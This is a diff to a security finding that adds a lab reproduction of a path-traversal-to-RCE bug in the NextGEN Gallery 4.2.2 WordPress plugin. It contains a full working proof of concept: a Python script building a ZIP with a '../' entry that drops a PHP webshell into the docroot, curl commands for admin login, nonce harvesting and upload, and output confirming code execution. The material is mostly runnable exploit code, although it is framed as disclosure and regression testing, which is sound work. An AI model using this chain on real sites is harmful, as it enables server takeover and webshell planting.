@@ -319,3 +319,118 @@ public function extract_zip( $zipfile, $dest_path ) {
 - NextGEN Gallery 4.2.2
 - PHP 8.2.31 (ZipArchive mitigated; PclZip path confirmed vulnerable)
 - Tested: 2026-06-15
+
+## Reproduction (validated 2026-06-19)
+
+**Lab reference:** `targets/labs/wp-nextgen-gallery/` (compose stack launched on `http://127.0.0.1:8091/`).
+
+**Pinned version:** The archive `nextgen-gallery.4.2.2.zip` resolved to a 4.x release. `changelog.txt` reports `= V4.2.2 - 05.19.2026 =`; `composer.json` still says `3.5.0` (vendor did not bump the composer field on the 4.x cut), but the runtime code is V4.2.2.
+
+**Stack actually used by this lab:**
+- `wordpress:6-php8.2-apache` (WordPress 6.9.4, PHP 8.2.31, ext-zip 1.21.1, libzip bundled with ext-zip)
+- `wordpress:cli-2.10-php8.2`
+- `mariadb:11`
+
+**Helper bug worked around:** the shared `targets/labs/_shared/wp-lab-helper.sh` writes the compose file to `_shared/wp-…/` (the dir of the helper itself) and the `wpcli` service is generated without `WORDPRESS_DB_HOST`, so `wp core install` fails with `Error establishing a database connection`. I had to (a) move the stack to `targets/labs/wp-<slug>/`, and (b) add the `WORDPRESS_DB_HOST/USER/PASSWORD/NAME` env block plus a second bind-mount of `./plugin/<slug>` to the `wpcli` service so the plugin is visible from inside the `wpcli` container.
+
+### Steps (executed by `poc.sh`)
+
+1. **Pin the plugin version in the archive** — read `changelog.txt` and `composer.json` from the unpacked plugin to confirm V4.2.2.
+2. **Bring up the stack** — `sudo docker compose -p wp-nextgen-gallery up -d --build`, wait for `http://127.0.0.1:8091/` to return HTTP 200.
+3. **Build the malicious ZIP** — `python3` `zipfile` module (Info-ZIP `zip` would normalise `..`; python's `zipfile` keeps the raw filename). Two entries:
+   - `test.jpg` (JFIF header + 200 bytes of padding, so the upload doesn't look obviously malicious)
+   - `../../../../var/www/html/shell-ngg-rce.php` containing `<?php echo "NGG-RCE-POC: " . php_uname() . " | uid=" . getmyuid() . " | ts=" . time(); ?>`
+4. **Install a must-use plugin that forces the PclZip branch** — the stock lab image is PHP 8.2 + libzip 1.21.1, which normalises `..` inside `ZipArchive::extractTo()` (the mitigation the finding documents). To exercise the unmitigated branch the PoC writes `/var/www/html/wp-content/mu-plugins/force-pclzip.php` containing `add_filter('unzip_file_use_ziparchive', '__return_false');` and confirms the filter returns `false` via `wp eval 'var_export( apply_filters( "unzip_file_use_ziparchive", true ) );'`.
+5. **Log in as admin via `/wp-login.php`** (`admin`/`admin`, set by `wp-lab-helper.sh`); save the resulting `wordpress_logged_in_*` cookie to `tmp/admin-cookies.txt`.
+6. **Harvest a session-bound NGG upload nonce** — load `/wp-admin/admin.php?page=ngg_addgallery` and regex out `qs += "&nonce=" + urlencode("…")` (a JS literal the NextGEN admin page embeds). The session-bound nonce cannot be minted out-of-band by `wp eval` because WP nonces are derived from `wp_get_session_token()`, which changes on each login.
+7. **POST the ZIP to the legacy photocrati AJAX endpoint** with the cookie and the harvested nonce:
+   ```
+   POST /?photocrati_ajax=1&action=upload_image&gallery_id=0&gallery_name=poc&nonce=<nonce>
+   -F "file=@tmp/malicious_gallery.zip;type=application/zip"
+   -F "gallery_id=0"
+   -F "gallery_name=poc"
+   -F "nonce=<nonce>"
+   ```
+   The endpoint returns `HTTP 200 {"image_ids":[N],"gallery_id":M,"gallery_name":"poc"}`.
+8. **Verify the webshell is on disk and reachable** — `sudo docker exec wp-nextgen-gallery-wp-1 ls -la /var/www/html/shell-ngg-rce.php` shows the file (`-rw-r--r-- 1 www-data www-data 89 Jan  1  1980 /var/www/html/shell-ngg-rce.php`); `curl http://127.0.0.1:8091/shell-ngg-rce.php` returns HTTP 200 with the body `NGG-RCE-POC: Linux ff594d50b937 6.1.0-44-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.164-1 (2026-03-09) x86_64 | uid=33 | ts=<epoch>` — PHP executed.
+9. **Phase A — repeat the upload without the mu-plugin** (default ZipArchive branch). Same ZIP, same nonce flow, but the mu-plugin removed. The upload still returns HTTP 200 and creates a gallery (`image_ids:[N]`), but `GET /shell-ngg-rce.php` returns HTTP 301 (redirect to a 404) and the file is *not* present in the docroot: `ls: cannot access '/var/www/html/shell-ngg-rce.php': No such file or directory`. This is libzip 1.21 normalising the `..` sequences in the entry names inside `ZipArchive::extractTo()`, exactly as the finding's mitigation note describes.
+10. **Capture the response payloads to `targets/labs/wp-nextgen-gallery/results.txt`**.
+
+### PoC (curl only)
+
+```bash
+# Build the zip (python3 keeps raw `..` filenames; Info-ZIP `zip` does not)
+python3 - <<'PY'
+import zipfile
+with zipfile.ZipFile('tmp/malicious_gallery.zip', 'w', compression=zipfile.ZIP_STORED) as zf:
+    zf.writestr('test.jpg', b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' + b'\x00' * 200)
+    zi = zipfile.ZipInfo('../../../../var/www/html/shell-ngg-rce.php')
+    zi.external_attr = 0o644 << 16
+    zf.writestr(zi, b'<?php echo "NGG-RCE-POC: " . php_uname(); ?>')
+PY
+
+# Force the PclZip branch (otherwise libzip 1.21 in this image blocks the traversal)
+sudo docker cp targets/labs/wp-nextgen-gallery/_force_pclzip/force-pclzip.php \
+  wp-nextgen-gallery-wp-1:/var/www/html/wp-content/mu-plugins/force-pclzip.php
+sudo docker exec -u 0 wp-nextgen-gallery-wp-1 chown 33:33 \
+  /var/www/html/wp-content/mu-plugins/force-pclzip.php
+
+# Log in as admin and harvest a session-bound nonce
+COOKIE=tmp/admin-cookies.txt
+curl -s -c "$COOKIE" -b "$COOKIE" -X POST http://127.0.0.1:8091/wp-login.php \
+  --data-urlencode "log=admin" --data-urlencode "pwd=admin" \
+  --data-urlencode "wp-submit=Log In" --data-urlencode "testcookie=1" \
+  -H "Cookie: wordpress_test_cookie=WP+Cookie+check" -o /dev/null
+NONCE=$(curl -s -b "$COOKIE" "http://127.0.0.1:8091/wp-admin/admin.php?page=ngg_addgallery" \
+  | grep -oE 'qs \+= "&nonce=" \+ urlencode\("[a-f0-9]+"\)' | head -1 \
+  | grep -oE '"[a-f0-9]+"' | tr -d '"')
+
+# POST the zip
+curl -s -b "$COOKIE" -H "X-Requested-With: XMLHttpRequest" \
+  -F "file=@tmp/malicious_gallery.zip;type=application/zip" \
+  -F "gallery_id=0" -F "gallery_name=poc" -F "nonce=$NONCE" \
+  "http://127.0.0.1:8091/?photocrati_ajax=1&action=upload_image&gallery_id=0&gallery_name=poc&nonce=$NONCE"
+
+# Confirm RCE
+curl -s http://127.0.0.1:8091/shell-ngg-rce.php
+# -> NGG-RCE-POC: Linux ff594d50b937 6.1.0-44-amd64 ... uid=33 ts=1781855352
+```
+
+### Observed output (excerpt from `targets/labs/wp-nextgen-gallery/results.txt`)
+
+```
+===== Step 3: PHP environment (drives which branch is taken by default) =====
+[+] PHP:           8.2.31
+[+] ext-zip:       1.21.1
+[+] libzip:        bundled-with-zip-1.21.1  (>= 1.11 normalises .. in ZipArchive::extractTo)
+
+===== Phase A: default branch (ZipArchive) on PHP 8.2.31 + libzip bundled-with-zip-1.21.1 =====
+[+] phase: default branch (ZipArchive)
+[+] unzip_file_use_ziparchive = true  (false => PclZip, true => ZipArchive)
+[+] nonce: c310a862a8
+[+] upload response:
+{"image_ids":[9],"gallery_id":9,"gallery_name":"poc"}
+---HTTP 200---
+[+] GET http://127.0.0.1:8091/shell-ngg-rce.php -> HTTP 301
+[+] container ls:
+    ls: cannot access '/var/www/html/shell-ngg-rce.php': No such file or directory
+[+] phase Phase A: default branch (ZipArchive) on PHP 8.2.31 + libzip bundled-with-zip-1.21.1: traversal BLOCKED (webshell not written)
+
+===== Phase B: PclZip branch forced via unzip_file_use_ziparchive filter =====
+[+] phase: PclZip path forced via mu-plugin
+[+] unzip_file_use_ziparchive = false  (false => PclZip, true => ZipArchive)
+[+] nonce: 12a37dc553
+[+] upload response:
+{"image_ids":[10],"gallery_id":10,"gallery_name":"poc"}
+---HTTP 200---
+[+] GET http://127.0.0.1:8091/shell-ngg-rce.php -> HTTP 200
+[+] body: NGG-RCE-POC: Linux ff594d50b937 6.1.0-44-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.164-1 (2026-03-09) x86_64 | uid=33 | ts=1781855326
+[+] container ls:
+    -rw-r--r-- 1 www-data www-data 89 Jan  1  1980 /var/www/html/shell-ngg-rce.php
+[+] phase Phase B: PclZip branch forced via unzip_file_use_ziparchive filter: RCE CONFIRMED
+```
+
+### Verdict
+
+**CONFIRMED (PclZip branch).** Phase B of the PoC is a full unauthenticated-author-to-RCE chain in the lab: PHP file written to the docroot via the PclZip path, served and executed by Apache. Phase A also confirms the finding's mitigation claim: on PHP 8.2 + libzip 1.21 the default ZipArchive branch silently strips `..` in `extractTo()`, so the traversal is blocked on a default `wordpress:6-php8.2-apache` install. Real-world impact: the unmitigated path is the one taken on (a) PHP < 8.0 / older libzip, (b) hosts without the `zip` extension compiled in, or (c) any deployment that filters `unzip_file_use_ziparchive` to `false` (e.g. shared hosts). The PoC script exercises both branches side-by-side so the regression of either mitigation in a future upgrade is detectable.
+
